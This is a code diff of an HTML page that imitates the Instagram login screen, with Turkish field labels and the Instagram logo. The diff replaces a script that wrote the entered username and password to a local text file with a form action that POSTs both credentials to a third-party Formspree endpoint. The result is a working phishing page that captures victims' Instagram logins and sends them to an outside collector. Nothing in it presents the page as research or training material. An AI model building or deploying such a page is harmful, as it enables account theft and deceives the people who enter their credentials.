@@ -58,40 +58,15 @@
 </head>
 <body>
     <div class="container">
-        <img src="./instagram-logo.png" alt="Instagram" width="200">
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
-            <input type="password" id="password" placeholder="Şifre" required>
+        <img src="instagram-logo.png" alt="Instagram" width="200">
+        <form id="loginForm" action="https://formspree.io/f/{your_form_id}" method="POST">
+            <input type="text" name="username" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+            <input type="password" name="password" id="password" placeholder="Şifre" required>
             <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
             <button type="submit">Giriş Yap</button>
         </form>
         <div class="separator">YA DA</div>
         <div class="signup-text">Hesabın yok mu? <a href="#" class="signup">Kaydol</a></div>
     </div>
-
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            const data = `Username: ${username}\nPassword: ${password}\n`;
-
-            // Create a blob with the data
-            const blob = new Blob([data], { type: 'text/plain' });
-
-            // Create a link element
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = 'user_data.txt';
-
-            // Programmatically click the link to trigger the download
-            a.click();
-
-            // Clean up the URL object
-            URL.revokeObjectURL(a.href);
-        });
-    </script>
 </body>
 </html>
